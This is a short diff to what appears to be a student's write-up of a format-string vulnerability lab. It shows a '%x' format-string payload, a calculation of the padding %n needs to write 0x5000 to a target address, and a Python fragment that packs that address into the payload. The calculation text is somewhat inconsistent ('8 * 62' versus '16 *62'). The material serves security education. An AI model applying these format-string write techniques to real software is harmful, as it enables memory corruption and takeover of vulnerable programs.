@@ -119,7 +119,7 @@ hPabcd%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x
 
 ### Task 3 B
 
- - In this exercice we will make a little change we need to change the variable to 0x5000 wich is 20480 give that he %n counts how many bytes where writen we need to put in the printf 20480 - 4 (for the 4 characters writeen) - 8 * 62(each %.16x prints 16 characters) so we get 20480 - 16 *62 - 4 = 
+ - In this exercice we will make a little change we need to change the variable to 0x5000 wich is 20480 give that he %n counts how many bytes where writen we need to put in the printf 20480 - 4 (for the 4 characters writeen) - 8 * 62(each %.16x prints 16 characters) so we get 20480 - 16 *62 - 4 =  19484
  ```python
 number  = 0x080e5068
 content[0:4]  =  (number).to_bytes(4,byteorder='little')
